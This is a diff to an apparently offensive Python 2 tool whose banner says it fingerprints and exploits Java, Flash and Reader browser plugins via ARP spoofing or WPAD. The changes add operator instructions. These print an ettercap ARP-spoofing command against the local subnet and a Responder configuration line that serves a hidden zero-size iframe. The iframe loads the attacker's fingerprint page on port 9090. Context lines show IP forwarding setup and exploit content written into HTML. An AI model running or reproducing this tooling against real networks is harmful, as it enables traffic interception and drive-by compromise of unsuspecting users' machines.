@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 from threading import Thread
 from SocketServer import ThreadingMixIn
 from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
@@ -5,7 +6,7 @@ import string,cgi,time,urlparse,commands,os,subprocess
 from os import curdir, sep
 import sys
 
-javaSelfsigned=True
+javaSelfsigned=False
 
 runFlash=True
 runJava=True
@@ -239,7 +240,6 @@ def modifyHTML(filename):
     fo1.writelines(contentExploit)
     fo1.close()
 def setupForwarding():
-	print "[*] Setup forwarding"
 	cmd = "sysctl -w net.ipv4.ip_forward=1"
 	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
 	cmd = "echo '1' > /proc/sys/net/ipv4/ip_forward"
@@ -309,10 +309,16 @@ def main():
 	print bcolors.OKGREEN+"[Fingerprints and Exploits Browser Plugins (Java/Flash/Reader) via ARP Spoofing/WPAD]\n"+bcolors.ENDC
 	startMITMproxy()
 	modifyHTML('fingerprint_template.html')
-	print "[*] Run the below command in another terminal (replace X with the target host)"
+	print "[*] If you want to use ARP spofing, run the command in another terminal (replace X with the target host)"
 	ipSplit=gatewayIP.split(".")
 	subnetStr=ipSplit[0]+'.'+ipSplit[1]+'.'+ipSplit[2]+'.X'
 	print bcolors.OKGREEN+"ettercap -T -q -M ARP /"+subnetStr+"/  /"+gatewayIP+"/"+bcolors.ENDC
+	print 
+
+	ipAddr = getIP('eth0')
+	print "[*] If you want to use WPAD with Responder, replace the below line in Responder.conf"
+	print bcolors.OKGREEN+"HTMLToServe = <html><head></head><body><iframe height='0' width='0' src='http://"+ipAddr+":9090/fingerprint.html' style='visibility:hidden;display:none'></iframe></body></html>"+bcolors.ENDC
+
         server.serve_forever()
     except KeyboardInterrupt:
         print '^C received, shutting down server'
